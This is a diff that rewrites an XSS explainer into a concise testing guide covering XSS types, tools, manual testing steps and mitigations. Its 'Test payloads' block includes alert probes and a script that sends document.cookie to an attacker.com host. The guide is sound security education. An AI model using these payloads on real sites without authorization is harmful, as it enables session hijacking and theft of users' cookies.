@@ -1,33 +1,49 @@
 # What is XSS (Cross-Site Scripting)?
-Cross-Site Scripting (XSS) is a type of cyber attack where attackers inject malicious scripts into web pages viewed by other users. These scripts can steal sensitive information, hijack user sessions, or deface websites. XSS attacks occur when web applications don't properly validate or sanitize user input, allowing attackers to inject and execute scripts in users' browsers.
 
-## How Does XSS Work?
-- Injection Point: Attackers find input fields on a website, such as search bars, comment sections, or form fields, where they can input malicious code.
+Cross-Site Scripting (XSS) lets attackers inject scripts that run in another user's browser. It is still in the OWASP Top 10 because developers keep trusting user input in HTML contexts.
 
-- Malicious Script: Attackers craft scripts containing malicious code, such as JavaScript, that can steal cookies, redirect users, or modify page content.
+## Types
 
-- Injection: Attackers inject the malicious script into the input field. When other users view the affected page, their browsers execute the injected script.
+- **Reflected** - payload in URL/form, bounces back in response
+- **Stored** - payload saved (comments, profiles), hits every visitor
+- **DOM-based** - JavaScript reads attacker input (`location.hash`) and writes it to the page
 
-- Execution: The injected script runs in the context of the victim's browser, allowing attackers to steal sensitive information, perform actions on behalf of the user, or manipulate the appearance of the page.
+## Test payloads
 
-## Example Scenario:
-Imagine a blog website with a comment section. An attacker posts a comment containing a script that steals users' session cookies. When other users view the comment, their browsers unknowingly execute the script, sending their session cookies to the attacker's server. With these cookies, the attacker can hijack users' sessions and impersonate them on the website.
+```html
+<!-- Quick probe -->
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
 
-## Impact of XSS
-- Data Theft: Attackers can steal sensitive information, such as session cookies, usernames, passwords, or credit card details, from unsuspecting users.
+<!-- Cookie theft (impact demo only, with authorization) -->
+<script>fetch('https://attacker.com/?c='+document.cookie)</script>
+```
 
-- Session Hijacking: XSS allows attackers to hijack users' sessions, enabling them to perform actions on behalf of the user, such as making unauthorized transactions or posting malicious content.
+## Tools
 
-- Phishing: Attackers can create convincing phishing pages that prompt users to enter their credentials or personal information, leading to identity theft or account compromise.
+- [Burp Suite](https://portswigger.net/burp) - Repeater, Intruder for context fuzzing
+- [XSS Hunter](https://xsshunter.com/) - blind XSS callback platform
+- [dalfox](https://github.com/hahwul/dalfox) - parameter-based XSS scanner
 
-## Mitigating XSS
-- Input Sanitization: Validate and sanitize user input to remove or escape potentially harmful characters before displaying them on web pages.
+## Manual testing
 
-- Content Security Policy (CSP): Implement CSP headers to restrict the sources from which content can be loaded, mitigating the impact of XSS attacks by blocking execution of injected scripts.
+1. Identify reflection points: search, error messages, profile fields
+2. Inject HTML tags; see if `<b>`, `<img>` render
+3. Break out of attribute context: `" onmouseover=alert(1) `
+4. Test in different roles (stored XSS may only show to admins)
 
-- Output Encoding: Encode user input and dynamically generated content to prevent browsers from interpreting it as executable code.
+## Mitigation
 
-- Browser Security Features: Educate users about browser security features like XSS filters and encourage them to keep their browsers up to date to protect against known vulnerabilities.
+- Context-aware output encoding (HTML, attribute, JS, URL)
+- Content-Security-Policy (CSP) with strict `script-src`
+- HTTPOnly cookies (limits session theft, not all XSS impact)
 
-## Conclusion
-XSS (Cross-Site Scripting) is a prevalent and dangerous web security vulnerability that allows attackers to inject and execute malicious scripts in users' browsers. By understanding how XSS works and implementing proper security measures such as input validation, output encoding, CSP headers, and browser security features, developers can mitigate the risk of exploitation and protect their applications from XSS attacks. Regular security audits and updates are essential for maintaining a secure web environment.
+## Deep dive
+
+- [XSS - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
+- [PortSwigger XSS labs](https://portswigger.net/web-security/cross-site-scripting)
+
+## CWE
+
+- CWE-79: Improper Neutralization of Input During Web Page Generation
